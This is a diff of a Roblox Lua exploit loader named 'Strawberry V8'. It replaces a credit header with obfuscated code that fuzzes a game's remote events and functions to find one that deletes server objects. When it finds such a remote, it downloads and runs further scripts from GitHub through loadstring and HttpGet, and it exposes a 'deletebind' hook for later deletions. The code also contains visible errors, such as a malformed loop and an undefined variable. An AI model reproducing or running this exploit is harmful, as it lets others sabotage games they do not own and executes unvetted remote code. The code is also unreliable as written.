@@ -1,26 +1,3 @@
---[[
-⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⡄⠀⠀⠀⠀⢀⠀⠀
-⠀⠀⠀⠀⠀⠀⣏⠓⠒⠤⣰⠋⠹⡄⠀⣠⠞⣿⠀⠀
-⠀⠀⠀⢀⠄⠂⠙⢦⡀⠐⠨⣆⠁⣷⣮⠖⠋⠉⠁⠀
-⠀⠀⡰⠁⠀⠮⠇⠀⣩⠶⠒⠾⣿⡯⡋⠩⡓⢦⣀⡀
-⠀⡰⢰⡹⠀⠀⠲⣾⣁⣀⣤⠞⢧⡈⢊⢲⠶⠶⠛⠁
-⢀⠃⠀⠀⠀⣌⡅⠀⢀⡀⠀⠀⣈⠻⠦⣤⣿⡀⠀⠀
-⠸⣎⠇⠀⠀⡠⡄⠀⠷⠎⠀⠐⡶⠁⠀⠀⣟⡇⠀⠀
-⡇⠀⡠⣄⠀⠷⠃⠀⠀⡤⠄⠀⠀⣔⡰⠀⢩⠇⠀⠀
-⡇⠀⠻⠋⠀⢀⠤⠀⠈⠛⠁⠀⢀⠉⠁⣠⠏⠀⠀⠀
-⣷⢰⢢⠀⠀⠘⠚⠀⢰⣂⠆⠰⢥⡡⠞⠁⠀⠀⠀⠀
-⠸⣎⠋⢠⢢⠀⢠⢀⠀⠀⣠⠴⠋⠀⠀⠀⠀⠀⠀⠀
-⠀⠘⠷⣬⣅⣀⣬⡷⠖⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠈⠁⠀
-
-made by C:\Drive, Saji, Sane⠀⠀
-
-C:\Drive - Gui, commands
-Saji - Commands, scanner
-Sane - Scanner
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-]]--
-
---=======================================================================================================================--
-loadstring(game:HttpGet("https://raw.githubusercontent.com/C-Dr1ve/Strawberry/refs/heads/main/Scanner_Source/v7.lua"))()
---=======================================================================================================================--
+-- // Strawberry V8 Loader (obfuscated)
+-- // by sane
+local a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z;a=game;b=a.GetService;c=b(a,"Players");d=b(a,"ReplicatedStorage");e=b(a,"StarterGui");f=b(a,"Workspace");g=b(a,"RunService");h=Instance.new("Hint",f);h.Text="STRAWBERRY V8: Initializing scanner...";i=function(a,b)pcall(function()e:SetCore("SendNotification",{Title="Strawberry V8",Text=tostring(a),Duration=b or 7.5})end)end;shared.strawberry={vulnRemote=nil,fireMethod=nil,vulnType="None"};j=function(a,b)return a==nil or a.Parent~=b end;k=function(a,b)local c=b.Parent;local l={ {b},{nil,b},{nil,nil,b},{"Destroy",b},{"delete",b},{"remove",b},{b.Name},{ {Target=b}},{ {object=b},{action="delete"}}};for m,n in ipairs(l)do pcall(function()if a:IsA("RemoteEvent")then a:FireServer(unpack(n))elseif a:IsA("RemoteFunction")then a:InvokeServer(unpack(n))end end);task.wait(0.1);if j(b,c)then print("STRAWBERRY V8: DELETION VULN CONFIRMED! Remote: "..a:GetFullName().." Pattern #"..m);shared.strawberry.vulnRemote=a;shared.strawberry.fireMethod=function(b)local c={};for _,d in ipairs(n)do if d==testPart then table.insert(c,b)else table.insert(c,d)end end;pcall(function()a:FireServer(unpack(c))end)end;shared.strawberry.vulnType="Deletion";return true end end;return false end;m=function()local b=tick();local e={};local j={d,f,game:GetService("StarterGui"),game:GetService("Lighting"),c.LocalPlayer.PlayerGui};for _,l in ipairs(j)do for ,m in ipairs(l:GetDescendants())do if m:IsA("RemoteEvent")or m:IsA("RemoteFunction")then if m.Parent and m.Parent.Name~="RobloxReplicatedStorage"and m.Parent.Name~="DefaultChatSystemChatEvents"then table.insert(e,m)end end end end;if #e==0 then h.Text="STRAWBERRY V8: No remotes found.";return end;for n,o in ipairs(e)do if shared.strawberry.vulnRemote then break end;h.Text=string.format("STRAWBERRY V8: Fuzzing... (%d/%d) | %s",n,#e,o.Name);local p=Instance.new("Part",c.LocalPlayer.Character);p.Name="StrawberryTestPart"..math.random(1000,9999);p.Anchored=false;p.CanCollide=false;p.Size=Vector3.new(1,1,1);if k(o,p)then break end;if p and p.Parent then p:Destroy()end end;local q=tick()-b;if shared.strawberry.vulnRemote then h.Text=string.format("STRAWBERRY V8: Backdoor found in %.2fs. Remote: %s",q,shared.strawberry.vulnRemote.Name);i("Backdoor found: "..shared.strawberry.vulnRemote:GetFullName(),10);loadstring(a:HttpGet("https://raw.githubusercontent.com/C-Dr1ve/Strawberry/main/Hook.lua"))();loadstring(a:HttpGet("https://raw.githubusercontent.com/C-Dr1ve/Strawberry/main/UI_Source/v7.lua"))();else h.Text="STRAWBERRY V8: Scan complete. No vulns found.";i("Scan complete. No vulnerable remotes found.",10)end;task.wait(10);h:Destroy()end;local r=Instance.new("BindableEvent",c.LocalPlayer);r.Name="deletebind";r.Event:Connect(function(a)if shared.strawberry and shared.strawberry.fireMethod then shared.strawberry.fireMethod(a)else warn("Strawberry: deletebind fired but no vuln loaded.")end end);task.wait(1);m();
